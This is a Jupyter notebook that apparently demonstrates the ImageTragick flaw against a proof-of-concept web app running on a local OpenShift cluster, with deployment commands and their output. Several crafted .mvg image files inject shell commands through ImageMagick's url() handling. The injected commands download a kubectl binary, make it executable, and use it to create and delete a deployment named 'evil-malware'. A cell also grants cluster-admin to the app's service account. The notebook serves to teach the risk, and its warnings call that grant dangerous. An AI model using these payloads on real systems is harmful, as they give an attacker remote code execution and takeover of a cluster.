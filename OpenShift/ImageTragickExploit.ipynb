{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**This notebook is covered by the following [license](../License.ipynb)  This note must not be removed**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "deployment.apps/poc configured\n"
     ]
    }
   ],
   "source": [
    "oc apply -f - <<EOF\n",
    "apiVersion: apps/v1\n",
    "kind: Deployment\n",
    "metadata:\n",
    "  name: poc\n",
    "  labels:\n",
    "    app: poc\n",
    "spec:\n",
    "  replicas: 1\n",
    "  selector:\n",
    "    matchLabels:\n",
    "      app: poc\n",
    "  template:\n",
    "    metadata:\n",
    "      labels:\n",
    "        app: poc\n",
    "    spec:\n",
    "      containers:\n",
    "      - name: imagetragick\n",
    "        command: [\"/bin/bash\"]\n",
    "        args: [\"-c\", \"while true; do node app.js ; date; echo restart ; done\"]\n",
    "        image: image-registry.openshift-image-registry.svc:5000/imagetragick/poc\n",
    "        ports:\n",
    "        - containerPort: 3000\n",
    "EOF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                       READY   STATUS        RESTARTS   AGE\n",
      "pod/poc-1-build            0/1     Completed     0          166m\n",
      "pod/poc-5c549f66c7-dzfm7   1/1     Running       0          5s\n",
      "pod/poc-9d548bdd4-zm4lk    1/1     Terminating   0          62m\n",
      "\n",
      "NAME          TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)    AGE\n",
      "service/poc   ClusterIP   10.217.5.30   <none>        3000/TCP   134m\n",
      "\n",
      "NAME                  READY   UP-TO-DATE   AVAILABLE   AGE\n",
      "deployment.apps/poc   1/1     1            1           136m\n",
      "\n",
      "NAME                             DESIRED   CURRENT   READY   AGE\n",
      "replicaset.apps/poc-5c549f66c7   1         1         1       5s\n",
      "replicaset.apps/poc-9d548bdd4    0         0         0       62m\n",
      "replicaset.apps/poc-c47995d9     0         0         0       136m\n",
      "\n",
      "NAME                                 TYPE     FROM   LATEST\n",
      "buildconfig.build.openshift.io/poc   Docker   Git    1\n",
      "\n",
      "NAME                             TYPE     FROM          STATUS     STARTED       DURATION\n",
      "build.build.openshift.io/poc-1   Docker   Git@832227b   Complete   3 hours ago   15m43s\n",
      "\n",
      "NAME                                 IMAGE REPOSITORY                                                           TAGS     UPDATED\n",
      "imagestream.image.openshift.io/poc   default-route-openshift-image-registry.apps-crc.testing/imagetragick/poc   latest   3 hours ago\n",
      "\n",
      "NAME                           HOST/PORT                           PATH   SERVICES   PORT   TERMINATION   WILDCARD\n",
      "route.route.openshift.io/poc   poc-imagetragick.apps-crc.testing          poc        3000                 None\n"
     ]
    }
   ],
   "source": [
    "oc get all"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "App running on localhost:3000\n"
     ]
    }
   ],
   "source": [
    "oc logs -l app=poc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "service/poc exposed\n"
     ]
    }
   ],
   "source": [
    "oc expose deployment poc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                     READY   STATUS      RESTARTS   AGE\n",
      "pod/poc-1-build          0/1     Completed   0          31m\n",
      "pod/poc-c47995d9-t7tzb   1/1     Running     0          105s\n",
      "\n",
      "NAME          TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)    AGE\n",
      "service/poc   ClusterIP   10.217.5.30   <none>        3000/TCP   6s\n",
      "\n",
      "NAME                  READY   UP-TO-DATE   AVAILABLE   AGE\n",
      "deployment.apps/poc   1/1     1            1           106s\n",
      "\n",
      "NAME                           DESIRED   CURRENT   READY   AGE\n",
      "replicaset.apps/poc-c47995d9   1         1         1       106s\n",
      "\n",
      "NAME                                 TYPE     FROM   LATEST\n",
      "buildconfig.build.openshift.io/poc   Docker   Git    1\n",
      "\n",
      "NAME                             TYPE     FROM          STATUS     STARTED          DURATION\n",
      "build.build.openshift.io/poc-1   Docker   Git@832227b   Complete   31 minutes ago   15m43s\n",
      "\n",
      "NAME                                 IMAGE REPOSITORY                                                           TAGS     UPDATED\n",
      "imagestream.image.openshift.io/poc   default-route-openshift-image-registry.apps-crc.testing/imagetragick/poc   latest   16 minutes ago\n"
     ]
    }
   ],
   "source": [
    "oc get all"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "route.route.openshift.io/poc exposed\n"
     ]
    }
   ],
   "source": [
    "oc expose service poc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                     READY   STATUS      RESTARTS   AGE\n",
      "pod/poc-1-build          0/1     Completed   0          32m\n",
      "pod/poc-c47995d9-t7tzb   1/1     Running     0          2m21s\n",
      "\n",
      "NAME          TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)    AGE\n",
      "service/poc   ClusterIP   10.217.5.30   <none>        3000/TCP   42s\n",
      "\n",
      "NAME                  READY   UP-TO-DATE   AVAILABLE   AGE\n",
      "deployment.apps/poc   1/1     1            1           2m21s\n",
      "\n",
      "NAME                           DESIRED   CURRENT   READY   AGE\n",
      "replicaset.apps/poc-c47995d9   1         1         1       2m21s\n",
      "\n",
      "NAME                                 TYPE     FROM   LATEST\n",
      "buildconfig.build.openshift.io/poc   Docker   Git    1\n",
      "\n",
      "NAME                             TYPE     FROM          STATUS     STARTED          DURATION\n",
      "build.build.openshift.io/poc-1   Docker   Git@832227b   Complete   32 minutes ago   15m43s\n",
      "\n",
      "NAME                                 IMAGE REPOSITORY                                                           TAGS     UPDATED\n",
      "imagestream.image.openshift.io/poc   default-route-openshift-image-registry.apps-crc.testing/imagetragick/poc   latest   16 minutes ago\n",
      "\n",
      "NAME                           HOST/PORT                           PATH   SERVICES   PORT   TERMINATION   WILDCARD\n",
      "route.route.openshift.io/poc   poc-imagetragick.apps-crc.testing          poc        3000                 None\n"
     ]
    }
   ],
   "source": [
    "oc get all"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "collapsed": true,
    "jupyter": {
     "outputs_hidden": true
    },
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "apiVersion: v1\n",
      "items:\n",
      "- apiVersion: route.openshift.io/v1\n",
      "  kind: Route\n",
      "  metadata:\n",
      "    annotations:\n",
      "      openshift.io/host.generated: \"true\"\n",
      "    creationTimestamp: \"2021-09-18T14:15:14Z\"\n",
      "    labels:\n",
      "      app: poc\n",
      "    managedFields:\n",
      "    - apiVersion: route.openshift.io/v1\n",
      "      fieldsType: FieldsV1\n",
      "      fieldsV1:\n",
      "        f:metadata:\n",
      "          f:labels:\n",
      "            .: {}\n",
      "            f:app: {}\n",
      "        f:spec:\n",
      "          f:port:\n",
      "            .: {}\n",
      "            f:targetPort: {}\n",
      "          f:to:\n",
      "            f:kind: {}\n",
      "            f:name: {}\n",
      "            f:weight: {}\n",
      "          f:wildcardPolicy: {}\n",
      "      manager: kubectl-expose\n",
      "      operation: Update\n",
      "      time: \"2021-09-18T14:15:14Z\"\n",
      "    - apiVersion: route.openshift.io/v1\n",
      "      fieldsType: FieldsV1\n",
      "      fieldsV1:\n",
      "        f:status:\n",
      "          f:ingress: {}\n",
      "      manager: openshift-router\n",
      "      operation: Update\n",
      "      time: \"2021-09-18T14:15:14Z\"\n",
      "    name: poc\n",
      "    namespace: imagetragick\n",
      "    resourceVersion: \"286967\"\n",
      "    uid: 03d4f6a5-b859-4515-9b79-8d434522a65d\n",
      "  spec:\n",
      "    host: poc-imagetragick.apps-crc.testing\n",
      "    port:\n",
      "      targetPort: 3000\n",
      "    to:\n",
      "      kind: Service\n",
      "      name: poc\n",
      "      weight: 100\n",
      "    wildcardPolicy: None\n",
      "  status:\n",
      "    ingress:\n",
      "    - conditions:\n",
      "      - lastTransitionTime: \"2021-09-18T14:15:14Z\"\n",
      "        status: \"True\"\n",
      "        type: Admitted\n",
      "      host: poc-imagetragick.apps-crc.testing\n",
      "      routerCanonicalHostname: apps-crc.testing\n",
      "      routerName: default\n",
      "      wildcardPolicy: None\n",
      "kind: List\n",
      "metadata:\n",
      "  resourceVersion: \"\"\n",
      "  selfLink: \"\"\n"
     ]
    }
   ],
   "source": [
    "oc get route -o yaml"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Go to the URL of the application in a browser and upload the `*.mvg` _images_ as pictures "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://poc-imagetragick.apps-crc.testing\n"
     ]
    }
   ],
   "source": [
    "echo http://$(oc get route poc -o jsonpath='{.spec.host}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "https://storage.googleapis.com/kubernetes-release/release/v1.22.2/bin/linux/amd64/kubectl\n"
     ]
    }
   ],
   "source": [
    "KURL=\"https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl\"\n",
    "echo $KURL\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "cat > kubectl.mvg <<EOF \n",
    "push graphic-context\n",
    "viewbox 0 0 640 480\n",
    "fill 'url(https://example.com/image.jpg\"|curl -o /tmp/kubectl https://storage.googleapis.com/kubernetes-release/release/v1.22.2/bin/linux/amd64/kubectl\")'\n",
    "pop graphic-context\n",
    "EOF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "cat > chmod.mvg <<EOF\n",
    "push graphic-context\n",
    "viewbox 0 0 640 480\n",
    "fill 'url(https://example.com/image.jpg\"|chmod 755 /tmp/kubectl\")'\n",
    "pop graphic-context\n",
    "EOF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️\n",
    "# we have a workin exploit now\n",
    "# ⛔ might work in older versions of Kubernetes ⛔ \n",
    "# **but not in newer ones or in OpenShift**\n",
    "# ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️\n",
    "\n",
    "## we need one other 💊 of poison\n",
    "\n",
    "# never ever do this \n",
    "# ☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️☢️☣️\n",
    "# your cluster will be tainted\n",
    "\n",
    "# no way to get the ghost back into the bottle 🧞"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Google, Google, how to start an Elasticsearch cluster\n",
    "\n",
    "🧞 **Cool, we have a an advice like this from a vendor**\n",
    "\n",
    " ⛔ _If you are using GKE, make sure your user has cluster-admin permissions. For more information, see Prerequisites for using Kubernetes RBAC on GKE._  ⛔\n",
    "\n",
    "\n",
    "⛔ https://www.elastic.co/guide/en/cloud-on-k8s/master/k8s-deploy-eck.html  ⛔"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "clusterrolebinding.rbac.authorization.k8s.io/cluster-admin-binding-imagetragick created\n"
     ]
    }
   ],
   "source": [
    "kubectl create clusterrolebinding cluster-admin-binding-imagetragick --clusterrole cluster-admin --serviceaccount imagetragick:default"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "poc-5c549f66c7-dzfm7\n"
     ]
    }
   ],
   "source": [
    "POD=$(oc get pods -l app=poc -o jsonpath='{.items[0].metadata.name}')\n",
    "echo $POD"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "I0919 08:07:24.092813     597 request.go:665] Waited for 1.174255392s due to client-side throttling, not priority and fairness, request: GET:https://10.217.4.1:443/apis/rbac.authorization.k8s.io/v1beta1?timeout=32s\n",
      "I0919 08:07:34.093762     597 request.go:665] Waited for 11.174618387s due to client-side throttling, not priority and fairness, request: GET:https://10.217.4.1:443/apis/controlplane.operator.openshift.io/v1alpha1?timeout=32s\n",
      "NAME                   READY   STATUS      RESTARTS   AGE\n",
      "poc-1-build            0/1     Completed   0          18h\n",
      "poc-5c549f66c7-dzfm7   1/1     Running     0          15h\n"
     ]
    }
   ],
   "source": [
    "oc exec $POD -- /tmp/kubectl get pods"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "cat > create.mvg <<EOF\n",
    "push graphic-context\n",
    "viewbox 0 0 640 480\n",
    "fill 'url(https://example.com/image.jpg\"|/tmp/kubectl create deployment evil-malware --image=k8s.gcr.io/echoserver:1.4\")'\n",
    "pop graphic-context\n",
    "EOF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                            READY   STATUS      RESTARTS   AGE\n",
      "evil-malware-67bd4f8588-2cvrk   1/1     Running     0          14s\n",
      "poc-1-build                     0/1     Completed   0          18h\n",
      "poc-5c549f66c7-dzfm7            1/1     Running     0          15h\n"
     ]
    }
   ],
   "source": [
    "oc get pods"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "cat > delete.mvg <<EOF\n",
    "push graphic-context\n",
    "viewbox 0 0 640 480\n",
    "fill 'url(https://example.com/image.jpg\"|/tmp/kubectl delete deployment evil-malware\")'\n",
    "pop graphic-context\n",
    "EOF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                   READY   STATUS      RESTARTS   AGE\n",
      "poc-1-build            0/1     Completed   0          18h\n",
      "poc-5c549f66c7-dzfm7   1/1     Running     0          15h\n"
     ]
    }
   ],
   "source": [
    "oc get pods"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "clusterrolebinding.rbac.authorization.k8s.io \"cluster-admin-binding-imagetragick\" deleted\n"
     ]
    }
   ],
   "source": [
    "kubectl delete clusterrolebinding cluster-admin-binding-imagetragick"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Bash",
   "language": "bash",
   "name": "bash"
  },
  "language_info": {
   "codemirror_mode": "shell",
   "file_extension": ".sh",
   "mimetype": "text/x-sh",
   "name": "bash"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
